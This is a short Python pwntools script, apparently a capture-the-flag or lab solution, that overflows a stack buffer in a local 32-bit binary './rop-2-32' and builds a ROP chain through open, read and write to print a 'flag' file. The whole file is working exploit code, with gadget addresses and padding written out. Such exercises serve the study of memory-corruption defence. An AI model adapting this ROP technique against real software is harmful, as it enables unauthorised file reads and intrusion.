#!/usr/bin/env python

import os
from pwn import *

# some syscalls
"""
0x08048380  read@plt
0x080483a0  exit@plt
0x080483b0  open@plt
0x080483d0  write@plt
0x0804853e  some_function
0x08048390  printf@plt
"""

# some rop gadgets:
"""
    0x08048689 : pop esi ; pop edi ; pop ebp ; ret
    0x0804868a : pop edi ; pop ebp ; ret
"""

pop2_ret = p32(0x0804868a)
pop3_ret = p32(0x08048689)

# want buffer to look like this:
"""
[old_ebp]
[&open] [&pop3_ret] [&flag] [zeros] [zeros]
[&read] [&pop3_ret] [3] [&output_addr] [150]
[&printf] [zeros] [&output_addr]
"""

open_addr = p32(0x080483b0)
zeros = p32(0)
read_addr = p32(0x08048380)
fd = p32(3)
printf_addr = p32(0x080483d0)
write_addr = p32(0x080483d0)
size = p32(150)
stdout = p32(1)

# setting "flag" string
flag_addr = p32(0x80485ca)
if os.path.exists("\x01"):
    os.unlink("\x01")
os.symlink("flag", "\x01")

# setting output file string "("
output_addr = p32(0x804a000 + 800)
sanity = p32(0x0804859a)

# build buf
buf = "A"*140
buf += open_addr + pop3_ret + flag_addr + zeros*2
buf += read_addr + pop3_ret + fd + output_addr + size
buf += write_addr + pop3_ret + stdout + output_addr + size

p = process("./rop-2-32")
p.sendline(buf)
p.interactive()
